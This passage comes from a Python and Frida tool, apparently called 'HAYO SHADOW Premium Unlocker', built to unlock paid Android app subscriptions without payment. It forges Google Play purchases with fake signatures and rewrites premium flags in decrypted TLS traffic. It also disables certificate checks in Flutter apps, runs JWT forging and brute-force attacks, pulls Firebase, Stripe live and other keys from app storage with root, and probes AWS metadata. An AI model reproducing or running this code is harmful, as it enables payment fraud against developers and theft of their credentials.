      var json='{"orderId":"GPA.HAYO-0000-0000-0000","packageName":"'+Java.use('android.app.ActivityThread').currentPackageName()+'","productId":"'+pid+'","purchaseTime":1700000000000,"purchaseState":0,"purchaseToken":"hayo_fake_token","quantity":1,"acknowledged":true,"autoRenewing":true}';
      return Purchase.$new(json,'HAYO_FAKE_SIG');
    }catch(e){ log('makeFakePurchase err '+e); return null; }
  }
  function spoofRead(){
    try{ var P=Java.use('com.android.billingclient.api.Purchase');
      try{P.getPurchaseState.implementation=function(){return 1;};}catch(e){}
      try{P.isAcknowledged.implementation=function(){return true;};}catch(e){}
      try{P.isAutoRenewing.implementation=function(){return true;};}catch(e){}
      log('Purchase read spoofed'); }catch(e){}
    try{ var BR=Java.use('com.android.billingclient.api.BillingResult');
      BR.getResponseCode.implementation=function(){return 0;}; }catch(e){}
  }
  function captureSku(){
    try{ var S=Java.use('com.android.billingclient.api.SkuDetails'); S.getSku.implementation=function(){ var r=this.getSku(); if(r){SKU=r; log('SKU='+r);} return r; }; }catch(e){}
    try{ var PD=Java.use('com.android.billingclient.api.ProductDetails'); PD.getProductId.implementation=function(){ var r=this.getProductId(); if(r){SKU=r; log('SKU='+r);} return r; }; }catch(e){}
  }
  function hookQueries(){
    try{
      var BC=Java.use('com.android.billingclient.api.BillingClient');
      BC.queryPurchasesAsync.overloads.forEach(function(ov){
        try{ ov.implementation=function(){
          try{
            var listener=arguments[arguments.length-1];
            var BR=Java.use('com.android.billingclient.api.BillingResult');
            var ok=BR.newBuilder().setResponseCode(0).build();
            var List=Java.use('java.util.ArrayList'); var l=List.$new();
            var fp=makeFakePurchase(); if(fp) l.add(fp);
            if(listener.onQueryPurchasesResponse){ listener.onQueryPurchasesResponse(ok, l); log('INJECTED queryPurchasesAsync fake='+l.size()); return; }
          }catch(e){ log('inject err '+e); }
          return ov.apply(this, arguments);
        }; }catch(e){}
      });
      log('queryPurchasesAsync hooked');
    }catch(e){ return false; }
    try{ var BC2=Java.use('com.android.billingclient.api.BillingClient');
      BC2.launchBillingFlow.overloads.forEach(function(ov){ try{ ov.implementation=function(){ try{ var BR=Java.use('com.android.billingclient.api.BillingResult'); log('launchBillingFlow→OK (spoof)'); return BR.newBuilder().setResponseCode(0).build(); }catch(e){ return ov.apply(this,arguments); } }; }catch(e){} });
    }catch(e){}
    return true;
  }
  var tries=0;
  function arm(){ tries++; try{ Java.use('com.android.billingclient.api.BillingClient'); }catch(e){ if(tries<40){ setTimeout(arm,1000); return; } log('BillingClient never loaded (open the paywall)'); return; }
    captureSku(); spoofRead(); hookQueries(); log('PLAY_ARMED'); }
  Java.perform(arm);
})();
'''
        out = self._run_frida_script(js, timeout=timeout) or ""
        if "PLAY_ARMED" in out:
            self._add_evidence("play_billing_hijack", "hook", "queryPurchasesAsync + Purchase spoof armed")
        if "INJECTED queryPurchasesAsync" in out:
            self._add_evidence("play_billing_inject", "billing", "fake active subscription injected")
            self._log("💉 حُقنت عملية اشتراك نشطة مزيّفة في استعلام المشتريات.", "EXPLOIT")
        if "BillingClient never loaded" in out:
            self._log("ℹ️ فئات الفوترة لم تُحمّل — افتح شاشة الدفع/الاشتراك ثم أعد المحاولة.", "INFO")
        confirmed, _ev = self.confirm_premium()
        if confirmed:
            self.successful_attacks.append("google_play_billing_hijack")
        return confirmed

    # ============================================================
    # PHASE 8.4: UNIVERSAL entitlement interceptor (كل الأطر + السحابي)
    # ============================================================

    def universal_entitlement_intercept(self, timeout: int = 45) -> bool:
        """
        الاستراتيجية العالمية — تعمل على كل تطبيقات أندرويد الحديثة بغضّ النظر عن الإطار
        (Java/Kotlin/Flutter/React Native/Unity/Xamarin) لأنها تعترض عند نقطة الالتقاء الوحيدة:
        طبقة TLS الأصلية (BoringSSL/OpenSSL) عبر SSL_read — فتقرأ استجابة الاستحقاق بعد
        فكّ تشفيرها *داخل العملية* (تجاوز تلقائي لأي تثبيت شهادة)، ثم تعيد كتابة أعلام الاشتراك.
        + طبقة Java (OkHttp/Retrofit) لإعادة كتابة غير مقيّدة بالطول.

        يغطّي التحقّق السحابي حين يُرجع الخادم علَمًا يثق به العميل. لا يُعلَن النجاح إلا إذا
        أكّده confirm_premium فعليًا (قاعدة: لا نتائج مزيّفة). المحتوى المحجوب خادميًا بالكامل
        لا يمكن اختلاقه — يُبلَّغ بصدق عندها.
        """
        self._log("🌐 Universal interceptor: native SSL_read + Java(OkHttp) entitlement rewrite (كل الأطر)...", "EXPLOIT")
        js = r'''
(function(){
  var TAG='[H7-UNIV]';
  function log(m){ try{ console.log(TAG+' '+m); }catch(e){} }
  var KEYS=["premium","ispremium","is_premium","pro","ispro","is_pro","vip","isvip","subscribed","issubscribed",
            "subscription","entitlement","entitlements","unlimited","haspremium","has_premium","ispaid","is_paid",
            "paid","membership","islicensed","purchased","ispurchased","isactive","isvipuser","premiumuser"];

  // إعادة كتابة داخل مخزن أصلي (نفس الطول للحفاظ على السلامة)
  function rewriteNative(addr,len){
    if(len<=0||len>2097152) return false;
    var s=''; try{ var u8=new Uint8Array(Memory.readByteArray(addr,len)); for(var i=0;i<u8.length;i++) s+=String.fromCharCode(u8[i]); }catch(e){ return false; }
    if(s.indexOf('premium')<0 && s.indexOf('subscri')<0 && s.indexOf('entitle')<0 && s.indexOf('"pro"')<0 && s.indexOf('vip')<0) return false;
    var changed=false;
    KEYS.forEach(function(k){
      var pairs=[
        ['"'+k+'":false','"'+k+'":true '],['"'+k+'": false','"'+k+'": true '],
        ['"'+k+'":0','"'+k+'":1'],
        ['"'+k+'":"false"','"'+k+'":"true "'],
        ['"'+k+'":"free"','"'+k+'":"paid"'],['"'+k+'":"none"','"'+k+'":"paid"'],
        ['"'+k+'":"basic"','"'+k+'":"pro  "'],['"'+k+'":"expired"','"'+k+'":"active "'],
        ['"'+k+'":"inactive"','"'+k+'":"active  "']
      ];
      pairs.forEach(function(p){
        if(p[1].length!==p[0].length) return;
        var idx=s.indexOf(p[0]);
        while(idx>=0){ for(var j=0;j<p[1].length;j++) Memory.writeU8(addr.add(idx+j),p[1].charCodeAt(j)); changed=true; idx=s.indexOf(p[0],idx+1); }
      });
    });
    if(changed) log('NATIVE_REWRITE');
    return changed;
  }

  var seen={};
  function hookMod(m){
    ['SSL_read','SSL_read_ex'].forEach(function(fn){
      var a=Module.findExportByName(m.name,fn); if(!a||seen[a.toString()])return; seen[a.toString()]=1;
      try{ Interceptor.attach(a,{onEnter:function(x){this.b=x[1];},onLeave:function(r){var n=r.toInt32(); if(this.b&&n>0) rewriteNative(this.b,n);}}); log('NATIVE_HOOK '+fn+'@'+m.name); }catch(e){}
    });
  }
  function scanAll(){
    Process.enumerateModules().forEach(function(m){ var n=m.name.toLowerCase();
      if(n.indexOf('ssl')>=0||n.indexOf('flutter')>=0||n.indexOf('monochrome')>=0||n.indexOf('conscrypt')>=0||n.indexOf('crypto')>=0||n.indexOf('cronet')>=0||n.indexOf('boringssl')>=0) hookMod(m); });
    var g=Module.findExportByName(null,'SSL_read'); if(g&&!seen[g.toString()]){seen[g.toString()]=1; try{Interceptor.attach(g,{onEnter:function(x){this.b=x[1];},onLeave:function(r){var n=r.toInt32(); if(this.b&&n>0) rewriteNative(this.b,n);}}); log('NATIVE_HOOK SSL_read@global');}catch(e){}}
  }
  scanAll();
  var dl=Module.findExportByName(null,'android_dlopen_ext')||Module.findExportByName(null,'dlopen');
  if(dl){ Interceptor.attach(dl,{onLeave:function(){ setTimeout(scanAll,150); }}); }

  // طبقة Java (OkHttp/Retrofit) — إعادة كتابة غير مقيّدة بالطول
  function jhook(){
    Java.perform(function(){
      function rw(str){ try{ var out=str; KEYS.forEach(function(k){ out=out.replace(new RegExp('("'+k+'"\\s*:\\s*)(false|0|"free"|"none"|"expired"|"basic"|"inactive")','gi'),'$1true'); }); if(out!==str){ log('JAVA_REWRITE'); return out; } }catch(e){} return str; }
      ['okhttp3.ResponseBody','com.android.okhttp.ResponseBody'].forEach(function(cn){
        try{ var RB=Java.use(cn); if(RB.string){ RB.string.implementation=function(){ return rw(this.string()); }; log('JAVA_HOOK '+cn+'.string'); } }catch(e){}
      });
    });
  }
  if(Java.available){ try{ jhook(); }catch(e){} }
  log('UNIVERSAL_ARMED');
})();
'''
        out = self._run_frida_script(js, timeout=timeout) or ""
        if "NATIVE_HOOK" in out or "JAVA_HOOK" in out:
            self._add_evidence("universal_intercept", "hook", "native SSL_read + Java entitlement hooks armed")
        if ("NATIVE_REWRITE" in out) or ("JAVA_REWRITE" in out):
            self._add_evidence("universal_rewrite", "mitm", "entitlement flag flipped in decrypted response")
            self._log("✏️ أُعيدت كتابة علَم استحقاق في الاستجابة المفكوكة.", "EXPLOIT")
        confirmed, _ev = self.confirm_premium()
        if confirmed:
            self.successful_attacks.append("universal_entitlement_intercept")
        elif "UNIVERSAL_ARMED" in out:
            self._log("ℹ️ الاعتراض العالمي عمل، لكن confirm_premium لم يؤكّد — قد يكون المحتوى محجوبًا خادميًا أو موقّعًا.", "INFO")
        return confirmed

    # ============================================================
    # PHASE 8.5: Flutter-aware advanced path (reFlutter-style)
    # ============================================================

    def detect_flutter(self) -> bool:
        """كشف ما إذا كان التطبيق مبنيًا بـ Flutter (libapp.so / libflutter.so)."""
        if self._is_flutter is not None:
            return self._is_flutter
        blob = ""
        # 1) الأكثر موثوقية: grep على فهرس الـAPK (يكشف libflutter حتى لو extractNativeLibs=false)
        paths = self._adb_cmd(f"shell pm path {self.package_name}")
        for line in paths.splitlines():
            apk = line.strip().replace("package:", "").strip()
            if apk:
                blob += self._adb_cmd(
                    f"shell \"grep -a -o -E 'lib(flutter|app)\\.so' '{apk}' 2>/dev/null | sort -u\"", timeout=25
                ).lower()
        # 2) المكتبات المحمّلة فعليًا في عملية التطبيق (إن كان يعمل)
        pid = self._adb_cmd(f"shell pidof {self.package_name}").strip().split(" ")[0]
        if pid:
            blob += self._adb_cmd(
                f"shell su -c 'grep -oE \"lib(flutter|app)\\.so\" /proc/{pid}/maps 2>/dev/null | sort -u'"
            ).lower()
        # 3) ملفات .so مستخرجة إلى مجلد lib (للحالات القديمة)
        blob += self._adb_cmd(f"shell su -c 'ls /data/app/*{self.package_name}*/lib/*/ 2>/dev/null'").lower()
        self._is_flutter = ("libflutter.so" in blob) or ("libapp.so" in blob)
        self._log(f"App runtime: {'Flutter (Dart/libapp.so)' if self._is_flutter else 'non-Flutter (Java/native)'}", "INFO")
        return self._is_flutter

    def flutter_tls_unpin_and_mitm(self, timeout: int = 40) -> bool:
        """
        المسار المتطور لأهداف Flutter (reFlutter-style):
        - هوكينغ نمطي/رمزي على BoringSSL المدمج في libflutter.so لفكّ تثبيت الشهادة (unpin).
        - اعتراض SSL_read وإعادة كتابة أعلام الاشتراك (isPremium:false → true) في الذاكرة،
          فيظنّ التطبيق أنه premium دون لمس منطق Dart.
        النجاح لا يُعلَن إلا إذا أكّده confirm_premium (قاعدة: لا نتائج مزيّفة).
        """
        self._log("🦋 Flutter path: reFlutter-style BoringSSL hook (unpin + entitlement rewrite)...", "EXPLOIT")
        js = r'''
(function(){
  var TAG='[H7-FLUTTER]';
  function log(m){ try{ console.log(TAG+' '+m); }catch(e){} }
  var done=false;
  var keys=['premium','isPremium','is_premium','isPro','pro','vip','isVip','subscribed','isSubscribed','entitlement','unlimited','has_premium','hasPremium','isPaid'];

  function rewriteBuf(addr, len){
    if(len<=0 || len>1048576) return;
    try{
      var bytes=new Uint8Array(Memory.readByteArray(addr, len));
      var s=''; for(var i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]);
      var changed=false;
      keys.forEach(function(k){
        ['"'+k+'":false','"'+k+'": false'].forEach(function(p){
          var idx=s.indexOf(p);
          while(idx>=0){
            var rep=p.replace('false','true ');   // نفس الطول للحفاظ على سلامة المخزن
            for(var j=0;j<rep.length;j++) Memory.writeU8(addr.add(idx+j), rep.charCodeAt(j));
            changed=true; idx=s.indexOf(p, idx+1);
          }
        });
      });
      if(changed) log('ENTITLEMENT_REWRITE');
    }catch(e){}
  }

  function hookExports(name){
    var mod=Process.findModuleByName(name); if(!mod) return false;
    var ok=false;
    mod.enumerateExports().forEach(function(e){
      var n=e.name.toLowerCase();
      if(n==='ssl_read'||n==='ssl_read_ex'){
        try{ Interceptor.attach(e.address,{ onEnter:function(a){ this.buf=a[1]; },
             onLeave:function(r){ var c=r.toInt32(); if(this.buf && c>0) rewriteBuf(this.buf,c); } });
             ok=true; log('HOOK ssl_read'); }catch(_){}
      }
      if(n.indexOf('verify_cert')>=0 || n==='ssl_verify_peer_cert' || n==='session_verify_cert_chain' || n.indexOf('x509_verify_cert')>=0){
        try{ Interceptor.replace(e.address, new NativeCallback(function(){ return 0; },'int',['pointer','pointer','pointer']));
             ok=true; log('REFLUTTER_HOOK_OK verify->0'); }catch(_){}
      }
    });
    return ok;
  }

  function patternScan(name){
    var mod=Process.findModuleByName(name); if(!mod) return false;
    var pats=['FF 03 05 D1 FC 6F 0A A9','FF 43 01 D1 FE 0F 1E F8','55 41 57 41 56 41 55 41 54 53 48'];
    var found=false;
    pats.forEach(function(p){ try{ Memory.scan(mod.base, mod.size, p, {
        onMatch:function(a){ found=true; log('REFLUTTER_HOOK_OK pattern@'+a);
          try{ Interceptor.attach(a,{ onLeave:function(r){ r.replace(0); } }); }catch(e){} },
        onComplete:function(){} }); }catch(e){} });
    return found;
  }

  function apply(name){
    if(done) return;
    if(hookExports(name) || patternScan(name)){ done=true; }
    else { log('REFLUTTER_NO_PATTERN'); }
  }

  if(Process.findModuleByName('libflutter.so')) apply('libflutter.so');
  var dl=Module.findExportByName(null,'android_dlopen_ext')||Module.findExportByName(null,'dlopen');
  if(dl){ Interceptor.attach(dl,{
      onEnter:function(a){ try{ this.p=a[0].readCString(); }catch(e){ this.p=''; } },
      onLeave:function(r){ if(this.p && this.p.indexOf('libflutter.so')>=0){ setTimeout(function(){ apply('libflutter.so'); },250); } } }); }
  log('reFlutter-style hook armed');
})();
'''
        out = self._run_frida_script(js, timeout=timeout) or ""
        if "REFLUTTER_HOOK_OK" in out:
            self._add_evidence("flutter_ssl_unpin", "hook", "BoringSSL verify neutralized (reFlutter-style)")
        if "ENTITLEMENT_REWRITE" in out:
            self._add_evidence("flutter_entitlement_rewrite", "mitm", "premium flags flipped in SSL_read buffer")
        if ("REFLUTTER_NO_PATTERN" in out) and ("REFLUTTER_HOOK_OK" not in out):
            self._log("⚠ لم يُعثر على نمط BoringSSL في libflutter (اختلاف إصدار) — يلزم ترقيع reFlutter ثابت للـ APK.", "WARN")
        confirmed, _ev = self.confirm_premium()
        if confirmed:
            self.successful_attacks.append("flutter_tls_mitm")
        return confirmed

    # ============================================================
    # PHASE 9: Orchestrator - Capped, Flutter-aware retry loop
    # ============================================================

    def unlock_premium(self) -> Dict[str, Any]:
        """الحلقة الرئيسية - سقف موجات + مسار Flutter ذكي (نتائج حقيقية فقط)."""
        self._log("☠️ SHADOW UNLOCK SEQUENCE INITIATED", "CRITICAL")
        
        # Launch app and keep alive
        self.launch_app()
        self.keep_alive(duration=120)
        
        # Deploy network interceptor
        self.deploy_network_interceptor()
        
        # Deploy billing bypass
        self.inject_billing_hook_enhanced()
        
        # 🩺 فحص صحة الهدف أولًا — لا نهدر هجمات على تثبيت معطوب/ناقص
        health = self.preflight_target_health()
        if not health.get("healthy", True):
            self._log("🛑 هدف غير صالح للاختبار — إيقاف مبكر بصدق.", "ERROR")
            return self._save_result(False, "target_broken_install: " + health.get("reason", ""), 0)

        # 🌐 الاستراتيجية العالمية (كل الأطر + التحقّق السحابي المعتمد على علَم)
        self._log("🌐 المرحلة 0: الاعتراض العالمي لطبقة TLS + Java (يعمل على كل أنواع التطبيقات)...", "EXPLOIT")
        if self.universal_entitlement_intercept():
            self._log("✅ PREMIUM UNLOCKED via universal entitlement interception", "SUCCESS")
            return self._save_result(True, "universal_entitlement_intercept", 0)

        # 💳 اختطاف Google Play Billing (لتطبيقات الاشتراك/إزالة الإعلانات)
        if self.google_play_billing_hijack():
            self._log("✅ PREMIUM UNLOCKED via Google Play billing hijack", "SUCCESS")
            return self._save_result(True, "google_play_billing_hijack", 0)

        # كشف نوع التطبيق مرة واحدة، وتشغيل المسار المتطور لأهداف Flutter
        is_flutter = self.detect_flutter()
        if is_flutter:
            self._log("🦋 Flutter target — منطق الاشتراك داخل libapp.so (Dart). تشغيل المسار المتطور أولًا...", "EXPLOIT")
            if self.flutter_tls_unpin_and_mitm():
                self._log("✅ PREMIUM UNLOCKED via Flutter TLS-unpin + entitlement rewrite", "SUCCESS")
                return self._save_result(True, "flutter_tls_mitm", 1)

        attempt = 0
        no_progress = 0

        while attempt < self.MAX_WAVES:
            attempt += 1
            self._log(f"\n{'='*60}", "INFO")
            self._log(f"☠️ ATTACK WAVE {attempt}", "CRITICAL")
            self._log(f"{'='*60}", "INFO")
            
            try:
                # Extract all secrets
                jwts = self.extract_jwt_all_sources()
                api_key = self._get_google_api_key()
                project_number = self._get_project_number()
                base_url = self._get_base_url()
                stripe_key = self._get_stripe_key()
                public_key = self._get_public_key()
                
                # 1. JWT attacks (all tokens)
                for jwt in jwts:
                    self._log(f"🔄 Processing JWT: {jwt[:30]}...", "ATTACK")
                    
                    forged_none = self.jwt_attack_alg_none(jwt)
                    if forged_none and self._test_token(forged_none):
                        self._log("✅ PREMIUM UNLOCKED via alg:none", "SUCCESS")
                        return self._save_result(True, "jwt_alg_none", attempt)
                    
                    forged_hs = self.jwt_attack_hs256_bruteforce(jwt)
                    if forged_hs and self._test_token(forged_hs):
                        self._log("✅ PREMIUM UNLOCKED via HS256 brute force", "SUCCESS")
                        return self._save_result(True, "jwt_hs256_brute", attempt)
                    
                    if public_key:
                        forged_kc = self.jwt_attack_key_confusion(jwt, public_key)
                        if forged_kc and self._test_token(forged_kc):
                            self._log("✅ PREMIUM UNLOCKED via key confusion", "SUCCESS")
                            return self._save_result(True, "jwt_key_confusion", attempt)
                    
                    # Test original token with API
                    if base_url:
                        ok, details = self.api_bruteforce_extended(base_url, jwt)
                        if ok:
                            self._log(f"✅ PREMIUM UNLOCKED via API brute: {details}", "SUCCESS")
                            return self._save_result(True, "api_bruteforce", attempt)
                        
                        self.manipulate_points(base_url, jwt)
                
                # 2. Cloud exploitation
                if api_key and project_number:
                    if self.exploit_firebase_extended(api_key, project_number):
                        confirmed, ev = self.confirm_premium()
                        if confirmed:
                            self._log("✅ PREMIUM UNLOCKED via Firebase exploitation", "SUCCESS")
                            return self._save_result(True, "firebase_exploit", attempt)
                
                if stripe_key:
                    self.exploit_stripe_key(stripe_key)
                
                # 3. Local storage tampering
                self.patch_all_local_storage()
                
                # 4. Check if premium was unlocked by any previous action
                confirmed, evidence = self.confirm_premium()
                if confirmed:
                    self._log("✅ PREMIUM CONFIRMED via local indicators", "SUCCESS")
                    return self._save_result(True, "local_indicators", attempt)
                
                # 5. AWS metadata probe
                self.exploit_aws_metadata()
                
                self.attempt_log.append({"wave": attempt, "success": False})

                # لأهداف Flutter: أعِد المسار المتطور، وتوقّف مبكرًا بصدق إن لم يتقدّم
                if is_flutter:
                    if self.flutter_tls_unpin_and_mitm(timeout=25):
                        self._log("✅ PREMIUM UNLOCKED via Flutter path (re-verify)", "SUCCESS")
                        return self._save_result(True, "flutter_tls_mitm", attempt)
                    no_progress += 1
                    if no_progress >= self.FLUTTER_EARLY_STOP:
                        self._log("🛑 Flutter target: هجمات طبقة Java غير مُجدية — توقّف مبكر بصدق.", "WARN")
                        self._log("   التوصية: reFlutter لترقيع libapp.so ثابتًا ثم إعادة التوقيع، أو تزويد إزاحة ssl_verify.", "INFO")
                        return self._save_result(False, "flutter_needs_reflutter", attempt)
                elif attempt % 5 == 0:
                    # لغير Flutter: أعِد الاعتراض العالمي دوريًا لالتقاط فحوص الاستحقاق السحابية المتأخرة
                    if self.universal_entitlement_intercept(timeout=25):
                        self._log("✅ PREMIUM UNLOCKED via universal interception (re-check)", "SUCCESS")
                        return self._save_result(True, "universal_entitlement_intercept", attempt)

                remaining = self.MAX_WAVES - attempt
                self._log(f"⏳ Wave {attempt} complete ({remaining} waves left). Retrying in 5s...", "WARN")
                time.sleep(5)
                
            except KeyboardInterrupt:
                self._log("Interrupted by user", "WARN")
                return self._save_result(False, "interrupted", attempt)
            except Exception as e:
                self._log(f"Wave {attempt} error: {e}", "ERROR")
                time.sleep(3)
        
        self._log(f"🏁 بلغت سقف الموجات ({self.MAX_WAVES}) دون تأكيد فتح الاشتراك — إبلاغ أمين.", "WARN")
        return self._save_result(False, "wave_cap_reached", attempt)
    
    def _test_token(self, token: str) -> bool:
        """اختبار صلاحية token ضد الخادم."""
        if not hasattr(self, '_base_url') or not self._base_url:
            self._base_url = self._get_base_url()
        
        if not self._base_url:
            return False
        
        try:
            resp = requests.get(
                urljoin(self._base_url, "/api/me"),
                headers={"Authorization": f"Bearer {token}"},
                timeout=5
            )
            if resp.status_code == 200:
                return any(kw in resp.text.lower() for kw in ['premium', 'pro', 'unlimited'])
        except:
            pass
        return False
    
    def _save_result(self, success: bool, method: str, attempts: int) -> Dict[str, Any]:
        """حفظ النتيجة النهائية مع الأدلة."""
        result = {
            "success": success,
            "method": method,
            "attempts": attempts,
            "timestamp": datetime.now().isoformat(),
            "target_email": self.target_email,
            "package": self.package_name,
            "successful_attacks": self.successful_attacks,
            "failed_attacks": self.failed_attacks,
            "attempt_log": self.attempt_log
        }
        
        # Save to loot
        result_file = os.path.join(self.loot_dir, f"premium_unlock_result_{int(time.time())}.json")
        with open(result_file, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        
        self._log(f"📄 Result saved to {result_file}", "INFO")
        return result
    
    # ============================================================
    # HELPERS
    # ============================================================
    
    def _get_google_api_key(self) -> Optional[str]:
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            match = re.search(r'AIza[0-9A-Za-z\-_]{35}', output)
            if match:
                return match.group(0)
        return None
    
    def _get_project_number(self) -> Optional[str]:
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            match = re.search(r'"project_number"\s*:\s*"?(\d+)"?', output)
            if match:
                return match.group(1)
        return None
    
    def _get_base_url(self) -> Optional[str]:
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            match = re.search(r'https?://[a-zA-Z0-9\-\.]+(?:/api)?', output)
            if match:
                return match.group(0)
        return None
    
    def _get_stripe_key(self) -> Optional[str]:
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            match = re.search(r'sk_live_[0-9a-zA-Z]{24,}', output)
            if match:
                return match.group(0)
        return None
    
    def _get_public_key(self) -> Optional[str]:
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/files/*.pem 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/files/*.pem 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            if 'BEGIN PUBLIC KEY' in output or 'BEGIN CERTIFICATE' in output:
                return output
        return None


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="HAYO SHADOW Premium Unlocker")
    parser.add_argument("--package", required=True, help="Package name")
    parser.add_argument("--device", default="emulator-5554")
    parser.add_argument("--adb", default="adb")
    parser.add_argument("--email", default="fmf0038@gmail.com")
    parser.add_argument("--verbose", action="store_true", default=True)
    parser.add_argument("--aggressive", action="store_true", default=True)
    
    args = parser.parse_args()
    
    unlocker = PremiumUnlockerAndroid(
        package_name=args.package,
        device=args.device,
        adb=args.adb,
        target_email=args.email,
        verbose=args.verbose,
        aggressive=args.aggressive
    )
    
    result = unlocker.unlock_premium()
    
    print("\n" + "="*60)
    print("SHADOW PREMIUM UNLOCK - FINAL RESULT")
    print("="*60)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return 0 if result["success"] else 1


if __name__ == "__main__":
    import sys
    sys.exit(main())